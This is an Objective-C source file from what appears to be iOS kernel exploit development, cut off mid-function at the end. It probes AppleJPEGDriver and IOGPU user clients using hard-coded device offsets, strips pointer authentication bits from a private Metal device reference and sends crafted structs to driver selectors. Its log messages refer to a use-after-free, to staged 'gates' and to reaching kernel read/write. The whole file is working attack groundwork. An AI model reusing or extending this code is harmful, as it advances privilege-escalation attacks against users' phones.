#import "JPEGDestTimeoutProbe.h"
#import "A14_23F77_LabOffsets.h"

#import <CoreFoundation/CoreFoundation.h>
#import <CoreGraphics/CoreGraphics.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <ImageIO/ImageIO.h>
#import <VideoToolbox/VideoToolbox.h>
#import <Metal/Metal.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/vm_map.h>
#import <setjmp.h>
#import <signal.h>
#import <stdarg.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <unistd.h>

typedef mach_port_t io_object_t;
typedef io_object_t io_service_t;
typedef io_object_t io_connect_t;
typedef struct __IOSurface *IOSurfaceRef;

typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOServiceOpen_t)(io_service_t, task_port_t, uint32_t, io_connect_t *);
typedef kern_return_t (*IOServiceClose_t)(io_connect_t);
typedef kern_return_t (*IOObjectRelease_t)(io_object_t);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t, const void *, size_t,
    uint64_t *, uint32_t *, void *, size_t *);
typedef kern_return_t (*IOConnectCallAsyncMethod_t)(
    mach_port_t, uint32_t, mach_port_t,
    uint64_t *, uint32_t,
    const uint64_t *, uint32_t, const void *, size_t,
    uint64_t *, uint32_t *, void *, size_t *);
typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(IOSurfaceRef);
typedef kern_return_t (*IOSurfaceLock_t)(IOSurfaceRef, uint32_t, uint32_t *);
typedef kern_return_t (*IOSurfaceUnlock_t)(IOSurfaceRef, uint32_t, uint32_t *);
typedef void *(*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);

static NSMutableString *j_buf;
static int j_fd = -1;

static void jlog(const char *fmt, ...) {
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if (n > (int)sizeof(lb) - 2) n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    if (j_buf) [j_buf appendFormat:@"%.*s", n, lb];
    if (j_fd >= 0) {
        write(j_fd, lb, (size_t)n);
        fcntl(j_fd, F_FULLFSYNC);
    }
}

static NSString *j_finish(void) {
    if (j_fd >= 0) {
        fcntl(j_fd, F_FULLFSYNC);
        close(j_fd);
        j_fd = -1;
    }
    return j_buf ?: @"STOP log";
}

static const char *jkr(kern_return_t r) {
    unsigned u = (unsigned)r;
    if (r == 0) return "SUCCESS";
    if (u == 0xe00002bc) return "kIOReturnError";
    if (u == 0xe00002c2) return "kIOReturnBadArgument";
    if (u == 0xe00002cc) return "kIOReturnCannotLock/dest-fail";
    if (u == 0xe00002d5) return "kIOReturnNoSpace";
    if (u == 0xe00002d6) return "kIOReturnTimeout";
    if (u == 0xe00002c7) return "kIOReturnUnsupported";
    if (u == 0x10000003) return "MACH_SEND_INVALID_DEST";
    return "?";
}

typedef struct {
    IOConnectCallMethod_t call;
    IOConnectCallAsyncMethod_t acall;
    io_connect_t conn;
    mach_port_t wake;
    uint8_t *big;
    uint8_t *outb;
    int n_2cc, n_2d6, n_ok, n_other, n_2bc;
} JFire;

static void j_pack(uint8_t *big, uint32_t src, uint32_t dst, uint32_t w, uint32_t h) {
    memset(big, 0, 0x2000);
    *(uint32_t *)(big + A14_23F77_JPEG_SRC_ID_OFF) = src;
    *(uint32_t *)(big + A14_23F77_JPEG_DEST_ID_OFF) = dst;
    *(uint32_t *)(big + 0x428) = w;
    *(uint32_t *)(big + 0x42c) = h;
}

static kern_return_t j_fire(JFire *f, int async, uint32_t sel, const char *tag) {
    memset(f->outb, 0, 0x2000);
    size_t outsz = 0x1000;
    uint32_t scout = 0;
    uint64_t ref1[8] = {0};
    kern_return_t kr;
    if (async && f->acall)
        kr = f->acall(f->conn, sel, f->wake, ref1, 1,
                      NULL, 0, f->big, 0x1000,
                      NULL, &scout, f->outb, &outsz);
    else
        kr = f->call(f->conn, sel, NULL, 0, f->big, 0x1000,
                     NULL, NULL, f->outb, &outsz);
    jlog("  %s %s sel=%u -> 0x%08x (%s)",
         tag, async ? "async" : "sync", sel, (unsigned)kr, jkr(kr));
    if (kr == 0) f->n_ok++;
    else if ((unsigned)kr == 0xe00002cc) f->n_2cc++;
    else if ((unsigned)kr == 0xe00002d6) f->n_2d6++;
    else if ((unsigned)kr == 0xe00002bc) f->n_2bc++;
    else f->n_other++;
    return kr;
}

static IOSurfaceRef j_surf(IOSurfaceCreate_t create, int w, int h, unsigned fourcc, int bpp) {
    NSDictionary *p = @{
        @"IOSurfaceWidth": @(w), @"IOSurfaceHeight": @(h),
        @"IOSurfaceBytesPerElement": @(bpp),
        @"IOSurfaceBytesPerRow": @(w * bpp),
        @"IOSurfaceAllocSize": @(w * h * bpp),
        @"IOSurfacePixelFormat": @(fourcc),
    };
    return create((__bridge CFDictionaryRef)p);
}

static uint32_t g_vt_dst_id;
static IOSurfaceGetID_t g_vt_getid;

static void j_vt_cb(void *refcon, void *src, OSStatus status, VTDecodeInfoFlags flags,
                    CVImageBufferRef imageBuffer, CMTime pts, CMTime dur) {
    int *st = (int *)refcon;
    if (st) *st = (int)status;
    (void)src; (void)flags; (void)pts; (void)dur;
    if (!imageBuffer || !g_vt_getid) return;
    IOSurfaceRef s = CVPixelBufferGetIOSurface(imageBuffer);
    if (s) g_vt_dst_id = g_vt_getid(s);
}

@implementation JPEGDestTimeoutProbe

+ (NSString *)runDestAndTimeoutOracle {
    j_buf = [NSMutableString string];
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"jpeg_dest_timeout_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    j_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    jlog("=== P008 dest wall v6 (VT IOSurface + lock/async) ===");
    jlog("[*] v5: every dest-ID slot 0x2cc. String: dest lookup OR lock failed.");
    jlog("[*] Use the IOSurface VT actually decoded into. No crop. No 20687 UAF.");
    jlog("time %s", [[[NSDate date] description] UTF8String]);

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { jlog("STOP dlopen"); return j_finish(); }

    IOServiceMatching_t matching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t getsvc = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t open = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t close = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t release = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t call = dlsym(iokit, "IOConnectCallMethod");
    IOConnectCallAsyncMethod_t acall = dlsym(iokit, "IOConnectCallAsyncMethod");
    mach_port_t *mp = dlsym(iokit, "kIOMainPortDefault");
    if (!mp) mp = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    IOSurfaceLock_t iosLock = dlsym(iosH, "IOSurfaceLock");
    IOSurfaceUnlock_t iosUnlock = dlsym(iosH, "IOSurfaceUnlock");
    IOSurfaceGetBaseAddress_t iosBase = dlsym(iosH, "IOSurfaceGetBaseAddress");
    if (!matching || !getsvc || !open || !call || !mp || !iosCreate || !iosGetID) {
        jlog("STOP dlsym");
        return j_finish();
    }
    g_vt_getid = iosGetID;

    /* tiny JPEG */
    NSMutableData *jpeg = [NSMutableData data];
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef bctx = CGBitmapContextCreate(NULL, 8, 8, 8, 32, cs, kCGImageAlphaPremultipliedLast);
    CGImageRef made = NULL;
    if (bctx) {
        CGContextSetRGBFillColor(bctx, 1, 0, 0, 1);
        CGContextFillRect(bctx, CGRectMake(0, 0, 8, 8));
        made = CGBitmapContextCreateImage(bctx);
        CGContextRelease(bctx);
    }
    if (cs) CGColorSpaceRelease(cs);
    if (made) {
        CGImageDestinationRef d = CGImageDestinationCreateWithData(
            (__bridge CFMutableDataRef)jpeg, CFSTR("public.jpeg"), 1, NULL);
        if (d) {
            CGImageDestinationAddImage(d, made, NULL);
            CGImageDestinationFinalize(d);
            CFRelease(d);
        }
        CGImageRelease(made);
    }
    jlog("tiny JPEG bytes=%zu", (size_t)jpeg.length);

    /* ImageIO (same-task, already known OK) */
    CGImageSourceRef gis = jpeg.length ? CGImageSourceCreateWithData((__bridge CFDataRef)jpeg, NULL) : NULL;
    if (gis) {
        CGImageRef cg = CGImageSourceCreateImageAtIndex(gis, 0, NULL);
        jlog("ImageIO: %s %zu x %zu", cg ? "OK" : "FAIL",
             cg ? (size_t)CGImageGetWidth(cg) : 0, cg ? (size_t)CGImageGetHeight(cg) : 0);
        if (cg) CGImageRelease(cg);
        CFRelease(gis);
    }

    /* VT decode — capture dest IOSurface ID from output pixel buffer */
    g_vt_dst_id = 0;
    int vtstat = 0x7fffffff;
    CMVideoFormatDescriptionRef fmt = NULL;
    if (CMVideoFormatDescriptionCreate(kCFAllocatorDefault, kCMVideoCodecType_JPEG, 8, 8, NULL, &fmt) == noErr && fmt) {
        NSDictionary *pbAttr = @{
            (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
            (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
        };
        CMBlockBufferRef bb = NULL;
        CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault, (void *)jpeg.bytes, jpeg.length,
                                           kCFAllocatorNull, NULL, 0, jpeg.length, 0, &bb);
        if (bb) {
            size_t sz = jpeg.length;
            CMSampleTimingInfo timing = { .duration = CMTimeMake(1, 30),
                .presentationTimeStamp = kCMTimeZero, .decodeTimeStamp = kCMTimeInvalid };
            CMSampleBufferRef sb = NULL;
            CMSampleBufferCreateReady(kCFAllocatorDefault, bb, fmt, 1, 1, &timing, 1, &sz, &sb);
            if (sb) {
                VTDecompressionOutputCallbackRecord cb = { j_vt_cb, &vtstat };
                VTDecompressionSessionRef sess = NULL;
                NSDictionary *destAttr = @{
                    (id)kCVPixelBufferIOSurfacePropertiesKey: @{},
                    (id)kCVPixelBufferPixelFormatTypeKey: @(kCVPixelFormatType_32BGRA),
                };
                OSStatus st = VTDecompressionSessionCreate(kCFAllocatorDefault, fmt, NULL,
                    (__bridge CFDictionaryRef)destAttr, &cb, &sess);
                jlog("VT session -> %d", (int)st);
                if (sess) {
                    VTDecodeInfoFlags info = 0;
                    st = VTDecompressionSessionDecodeFrame(sess, sb, 0, NULL, &info);
                    VTDecompressionSessionWaitForAsynchronousFrames(sess);
                    jlog("VT decode -> %d cb=%d vtDstID=%u", (int)st, vtstat, g_vt_dst_id);
                    VTDecompressionSessionInvalidate(sess);
                    CFRelease(sess);
                }
                CFRelease(sb);
            }
            CFRelease(bb);
        }
        CFRelease(fmt);
    }

    io_service_t svc = getsvc(*mp, matching("AppleJPEGDriver"));
    if (!svc) { jlog("STOP no AppleJPEGDriver"); return j_finish(); }
    io_connect_t conn = MACH_PORT_NULL;
    kern_return_t kr = open(svc, mach_task_self(), 0, &conn);
    jlog("IOServiceOpen type0 -> 0x%08x (%s) conn=%u", (unsigned)kr, jkr(kr), conn);
    if (kr != 0 || !conn) {
        jlog("STOP open");
        if (release) release(svc);
        return j_finish();
    }

    IOSurfaceRef src = j_surf(iosCreate, 8, 8, 'BGRA', 4);
    IOSurfaceRef dst8 = j_surf(iosCreate, 8, 8, 'BGRA', 4);
    IOSurfaceRef dst64 = j_surf(iosCreate, 64, 64, 'BGRA', 4);
    IOSurfaceRef dst420 = j_surf(iosCreate, 16, 16, '420v', 1);
    if (!src || !dst8) {
        jlog("STOP IOSurfaceCreate");
        if (close) close(conn);
        if (release) release(svc);
        return j_finish();
    }
    uint32_t srcID = iosGetID(src);
    uint32_t id8 = iosGetID(dst8);
    uint32_t id64 = dst64 ? iosGetID(dst64) : 0;
    uint32_t id420 = dst420 ? iosGetID(dst420) : 0;
    jlog("srcID=%u dst8=%u dst64=%u dst420=%u vtDst=%u", srcID, id8, id64, id420, g_vt_dst_id);
    if (iosLock && iosBase && iosUnlock && iosLock(src, 0, NULL) == 0) {
        uint8_t *b = iosBase(src);
        if (b && jpeg.length) {
            size_t n = jpeg.length;
            if (n > 8 * 8 * 4) n = 8 * 8 * 4;
            memcpy(b, jpeg.bytes, n);
            jlog("copied %zu JPEG bytes into src", n);
        }
        iosUnlock(src, 0, NULL);
    }

    uint8_t *big = calloc(1, 0x2000);
    uint8_t *outb = calloc(1, 0x2000);
    if (!big || !outb) { jlog("STOP calloc"); return j_finish(); }
    mach_port_t wake = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);
    JFire F = {0};
    F.call = call; F.acall = acall; F.conn = conn; F.wake = wake;
    F.big = big; F.outb = outb;

    typedef struct { const char *name; uint32_t dst; uint32_t w, h; } JCase;
    JCase cases[5];
    int nc = 0;
    cases[nc++] = (JCase){ "dst8-BGRA", id8, 8, 8 };
    if (id64) cases[nc++] = (JCase){ "dst64-BGRA", id64, 64, 64 };
    if (id420) cases[nc++] = (JCase){ "dst16-420v", id420, 16, 16 };
    if (g_vt_dst_id) cases[nc++] = (JCase){ "vt-output", g_vt_dst_id, 8, 8 };

    jlog("\n--- dest cases: sel=5 then sel=4, sync then async, dest unlocked ---");
    for (int i = 0; i < nc; i++) {
        j_pack(big, srcID, cases[i].dst, cases[i].w, cases[i].h);
        jlog("CASE %s dstID=%u %ux%u", cases[i].name, cases[i].dst, cases[i].w, cases[i].h);
        j_fire(&F, 0, 5, cases[i].name);
        j_fire(&F, 0, 4, cases[i].name);
        if (acall) {
            j_pack(big, srcID, cases[i].dst, cases[i].w, cases[i].h);
            j_fire(&F, 1, 5, cases[i].name);
        }
        if (F.n_ok || F.n_2d6) break;
    }

    /* dest LOCKED — string is lookup OR lock */
    jlog("\n--- dest8 LOCKED then sel=5 ---");
    if (iosLock) iosLock(dst8, 0, NULL);
    j_pack(big, srcID, id8, 8, 8);
    j_fire(&F, 0, 5, "dst8-LOCKED");
    if (iosUnlock) iosUnlock(dst8, 0, NULL);

    jlog("counts ok=%d dest-fail=%d TIMEOUT=%d Error=%d other=%d",
         F.n_ok, F.n_2cc, F.n_2d6, F.n_2bc, F.n_other);
    if (F.n_2d6 > 0)
        jlog("=== verdict: TIMEOUT — queued. Paste. Do not re-tap. ===");
    else if (F.n_ok > 0)
        jlog("=== verdict: SUCCESS — dest lookup passed. Crop next, not KRW. ===");
    else if (g_vt_dst_id && F.n_2cc > 0)
        jlog("=== verdict: even VT's dest IOSurface is 0x2cc. Lookup is not this task (workloop). Wall stands. ===");
    else if (F.n_2cc > 0)
        jlog("=== verdict: still dest-fail/lock. Wall stands. Paste cases. ===");
    else
        jlog("=== verdict: no dest-fail/success mix. Paste. ===");

    free(big); free(outb);
    if (wake) mach_port_mod_refs(mach_task_self(), wake, MACH_PORT_RIGHT_RECEIVE, -1);
    if (src) CFRelease(src);
    if (dst8) CFRelease(dst8);
    if (dst64) CFRelease(dst64);
    if (dst420) CFRelease(dst420);
    if (close) close(conn);
    if (release) release(svc);
    return j_finish();
}

typedef uint32_t (*p016_getconn_t)(void *);
typedef uint32_t (*p016_gettype_t)(void *);
typedef IOSurfaceRef (*IOSurfaceLookup_t)(uint32_t);
typedef size_t (*IOSurfaceGetAllocSize_t)(IOSurfaceRef);
typedef size_t (*IOSurfaceGetWidth_t)(IOSurfaceRef);
typedef size_t (*IOSurfaceGetHeight_t)(IOSurfaceRef);
typedef uint32_t (*IOSurfaceGetPixelFormat_t)(IOSurfaceRef);

static void *p016_ivar(id obj, const char *name) {
    if (!obj || !name) return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val) return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static id p016_unwrap(id buf) {
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s]) break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf) break;
        buf = b;
    }
    return buf;
}

static void *p016_ref(id buf) {
    buf = p016_unwrap(buf);
    SEL s = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:s]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, s);
}

+ (NSString *)runP016SoutDestUnlock {
    j_buf = [NSMutableString string];
    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p016_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    j_fd = open(path.UTF8String, O_CREAT | O_TRUNC | O_WRONLY, 0644);

    jlog("=== p016: sel36 sout reachability (IOSurfaceLookup) + optional JPEG dest ===");
    jlog("[*] Step A (THIS is the step-2 gate): IOSurfaceLookup(sout). FOUND vs NULL.");
    jlog("[*] Step B (separate): JPEG sel=5 dest@+0x%lx. 0xe00002cc = task/workloop wall.",
         (unsigned long)A14_23F77_JPEG_DEST_ID_OFF);
    jlog("[*] Do NOT treat JPEG 2cc as Lookup NULL. Do NOT treat Lookup FOUND as KRW.");
    jlog("[*] LookupFromMachPort is p018 (port path). sel36 scalarOut is a uint32 ID — Lookup(id) is correct.");
    jlog("[*] ABI: sel=%u scIn=%u scOut=%u len=0x%x type=0x%x size=0x%x",
         A14_23F77_IOGPU_SEL36, A14_23F77_IOGPU_SEL36_SCIN, A14_23F77_IOGPU_SEL36_SCOUT,
         A14_23F77_IOGPU_SEL36_LEN, A14_23F77_IOGPU_RES_TYPE_BYTES, A14_23F77_IOGPU_RES_SIZE);

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iogpu || !iokit || !iosH) { jlog("p016 STOP dlopen"); return j_finish(); }

    p016_gettype_t getType = dlsym(iogpu, "IOGPUResourceGetResourceType");
    p016_getconn_t devConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    IOConnectCallMethod_t call = dlsym(iokit, "IOConnectCallMethod");
    IOSurfaceLookup_t lookup = dlsym(iosH, "IOSurfaceLookup");
    IOSurfaceGetID_t getID = dlsym(iosH, "IOSurfaceGetID");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceLock_t iosLock = dlsym(iosH, "IOSurfaceLock");
    IOSurfaceUnlock_t iosUnlock = dlsym(iosH, "IOSurfaceUnlock");
    IOSurfaceGetBaseAddress_t iosBase = dlsym(iosH, "IOSurfaceGetBaseAddress");
    IOSurfaceGetAllocSize_t getSz = dlsym(iosH, "IOSurfaceGetAllocSize");
    IOSurfaceGetWidth_t getW = dlsym(iosH, "IOSurfaceGetWidth");
    IOSurfaceGetHeight_t getH = dlsym(iosH, "IOSurfaceGetHeight");
    IOSurfaceGetPixelFormat_t getFmt = dlsym(iosH, "IOSurfaceGetPixelFormat");
    IOServiceMatching_t matching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t getsvc = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t open = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t close = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t release = dlsym(iokit, "IOObjectRelease");
    mach_port_t *mp = dlsym(iokit, "kIOMainPortDefault");
    if (!mp) mp = dlsym(iokit, "kIOMasterPortDefault");
    if (!getType || !call || !lookup || !iosCreate || !getID || !matching || !getsvc || !open || !mp) {
        jlog("p016 STOP dlsym lookup=%p call=%p getType=%p getID=%p", lookup, call, getType, getID);
        return j_finish();
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { jlog("p016 STOP no Metal"); return j_finish(); }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    (void)q;
    id mtlDev = p016_unwrap(dev);
    void *devRefRaw = p016_ivar(mtlDev, "_deviceRef");
    void *devRef = (void *)((uintptr_t)devRefRaw & 0x0000007FFFFFFFFFULL);
    uint32_t dconn = (devConn && devRef) ? devConn(devRef) : 0;
    jlog("p016 [0] metal=%s dconn=%u (PAC-stripped deviceRef)", [[dev name] UTF8String], dconn);

    const vm_size_t Ls = A14_23F77_IOGPU_RES_SIZE;
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, Ls, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg) {
        jlog("p016 STOP vm_allocate");
        return j_finish();
    }
    memset((void *)pg, 0x41, (size_t)Ls);
    id buf = [dev newBufferWithBytesNoCopy:(void *)pg length:Ls
                                   options:MTLResourceStorageModeShared
                               deallocator:^(void *p, NSUInteger n) { (void)p; (void)n; }];
    void *ref = buf ? p016_ref(buf) : NULL;
    uint32_t typ = (ref && getType) ? getType(ref) : 0;
    if (!buf || !ref || typ != A14_23F77_IOGPU_RES_TYPE_BYTES) {
        jlog("p016 STOP no type 0x%x typ=0x%x", A14_23F77_IOGPU_RES_TYPE_BYTES, typ);
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    uint32_t rid = *(uint32_t *)((uint8_t *)ref + A14_23F77_IOGPU_RES_ID_OFF);
    void *devw = *(void **)((uint8_t *)ref + A14_23F77_IOGPU_RES_DEVW_OFF);
    uint32_t rconn = 0;
    if (devw)
        rconn = *(uint32_t *)((uint8_t *)((uintptr_t)devw & 0x7FFFFFFFFFULL) + A14_23F77_IOGPU_DEVW_CONN_OFF);
    uint32_t conn = dconn ? dconn : rconn;
    jlog("p016 [0] type=0x%x id=%u conn=%u (dconn=%u rconn=%u)",
         typ, rid, conn, dconn, rconn);
    if (!conn || !rid) {
        jlog("p016 STOP conn/id");
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }

    uint64_t in[3] = { rid, 0, A14_23F77_IOGPU_SEL36_LEN };
    uint64_t sout = 0;
    uint32_t nout = A14_23F77_IOGPU_SEL36_SCOUT;
    jlog("p016 [calib] sel36 {id=%u,0,0x%x} — if last line, died in sel36",
         rid, A14_23F77_IOGPU_SEL36_LEN);
    fcntl(j_fd, F_FULLFSYNC);
    kern_return_t kr = call(conn, A14_23F77_IOGPU_SEL36, in, A14_23F77_IOGPU_SEL36_SCIN,
                            NULL, 0, &sout, &nout, NULL, NULL);
    jlog("p016 [calib] sel36 kr=0x%08x (%s) sout=0x%llx nout=%u",
         (unsigned)kr, jkr(kr), (unsigned long long)sout, nout);
    fcntl(j_fd, F_FULLFSYNC);
    if (kr != 0) {
        jlog("p016 REACHABILITY: INCONCLUSIVE — sel36 not SUCCESS (kr!=0). Do not call this NULL.");
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    if (nout < 1) {
        jlog("p016 REACHABILITY: INCONCLUSIVE — nout=%u (need >=1). Do not call this NULL.", nout);
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    if (sout == 0) {
        jlog("p016 REACHABILITY: NULL-shaped — sel36 SUCCESS but sout==0 (no surface id).");
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    if ((sout >> 32) != 0) {
        jlog("p016 WARN: sout has high bits set (0x%llx) — truncating to u32 id; report if Lookup weird",
             (unsigned long long)sout);
    }

    uint32_t sid = (uint32_t)sout;
    IOSurfaceRef found = lookup(sid);
    jlog("p016 [lookup] IOSurfaceLookup(%u / 0x%x) = %p (%s)",
         sid, sid, found, found ? "FOUND" : "NULL");
    fcntl(j_fd, F_FULLFSYNC);
    if (!found) {
        jlog("p016 REACHABILITY: NULL — sout is not a this-task IOSurface id via Lookup.");
        jlog("p016 verdict: gate CLOSED by unreachability (step 2 → step 4). JPEG not run.");
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    uint32_t foundID = getID(found);
    if (foundID != sid) {
        jlog("p016 FALSE POSITIVE GUARD: GetID=%u != sid=%u — reject FOUND", foundID, sid);
        jlog("p016 REACHABILITY: INCONCLUSIVE — Lookup returned object with mismatched ID.");
        CFRelease(found);
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    size_t sz = getSz ? getSz(found) : 0;
    size_t w = getW ? getW(found) : 0;
    size_t h = getH ? getH(found) : 0;
    uint32_t fmt = getFmt ? getFmt(found) : 0;
    jlog("p016 [props] size=%zu w=%zu h=%zu fmt=0x%08x GetID=%u (matches sid)",
         sz, w, h, fmt, foundID);
    jlog("p016 REACHABILITY: FOUND — consumers can name this surface by id. Gate OPEN for step 3.");

    IOSurfaceRef src = j_surf(iosCreate, 8, 8, 'BGRA', 4);
    if (!src) {
        jlog("p016 STOP IOSurfaceCreate src (reachability already FOUND — JPEG not tested)");
        CFRelease(found);
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    uint32_t srcID = getID(src);
    if (iosLock && iosBase && iosUnlock && iosLock(src, 0, NULL) == 0) {
        void *b = iosBase(src);
        if (b) memset(b, 0xFF, 8 * 8 * 4);
        iosUnlock(src, 0, NULL);
    }
    jlog("p016 [src] IOSurfaceCreate 8x8 BGRA id=%u", srcID);

    io_service_t svc = getsvc(*mp, matching("AppleJPEGDriver"));
    if (!svc) {
        jlog("p016 JPEG: SKIP — no AppleJPEGDriver (reachability still FOUND)");
        CFRelease(found); CFRelease(src);
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    io_connect_t jconn = MACH_PORT_NULL;
    kr = open(svc, mach_task_self(), 0, &jconn);
    jlog("p016 [jpeg] IOServiceOpen type0 -> 0x%08x (%s) conn=%u", (unsigned)kr, jkr(kr), jconn);
    if (kr != 0 || !jconn) {
        jlog("p016 JPEG: SKIP — open failed (reachability still FOUND)");
        if (release) release(svc);
        CFRelease(found); CFRelease(src);
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }

    uint8_t *big = calloc(1, 0x2000);
    uint8_t *outb = calloc(1, 0x2000);
    if (!big || !outb) {
        jlog("p016 STOP calloc");
        if (close) close(jconn);
        if (release) release(svc);
        CFRelease(found); CFRelease(src);
        vm_deallocate(mach_task_self(), pg, Ls);
        return j_finish();
    }
    uint32_t dw = w ? (uint32_t)w : 8;
    uint32_t dh = h ? (uint32_t)h : 8;
    j_pack(big, srcID, sid, dw, dh);
    jlog("p016 [jpeg] dest=sout=%u sel5 sync struct+0x%lx — if last line, died in JPEG",
         sid, (unsigned long)A14_23F77_JPEG_DEST_ID_OFF);
    fcntl(j_fd, F_FULLFSYNC);
    size_t outsz = 0x1000;
    kr = call(jconn, 5, NULL, 0, big, 0x1000, NULL, NULL, outb, &outsz);
    jlog("p016 [jpeg] dest=sout sel5 sync -> 0x%08x (%s) outsz=%zu",
         (unsigned)kr, jkr(kr), outsz);
    fcntl(j_fd, F_FULLFSYNC);

    if (kr == 0)
        jlog("p016 JPEG: WALL FELL — dest lookup accepted sout. STOP. No crop until reported.");
    else if ((unsigned)kr == 0xe00002cc)
        jlog("p016 JPEG: wall stands — Lookup FOUND but JPEG dest still 0x2cc (workloop/task). Reachability still FOUND.");
    else
        jlog("p016 JPEG: unexpected kr=0x%08x (%s) — not 2cc. Report before crop. Reachability still FOUND.",
             (unsigned)kr, jkr(kr));

    free(big); free(outb);
    if (close) close(jconn);
    if (release) release(svc);
    CFRelease(found);
    CFRelease(src);
    vm_deallocate(mach_task_self(), pg, Ls);
    return j_finish();
}

typedef IOSurfaceRef (*IOSurfaceLookupFromMachPort_t)(mach_port_t);
typedef kern_return_t (*mach_port_kobject_t)(mach_port_t, mach_port_name_t, uint32_t *, uint64_t *);

static sigjmp_buf p018_jmp;
static volatile sig_atomic_t p018_sig;
static struct sigaction p018_old_segv, p018_old_bus, p018_old_ill;

static void p018_on_sig(int sig) {
    p018_sig = sig;
    siglongjmp(p018_jmp, 1);
}

static void p018_protect_on(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = p018_on_sig;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, &p018_old_segv);
    sigaction(SIGBUS, &sa, &p018_old_bus);
    sigaction(SIGILL, &sa, &p018_old_ill);
}

static void p018_protect_off(void) {
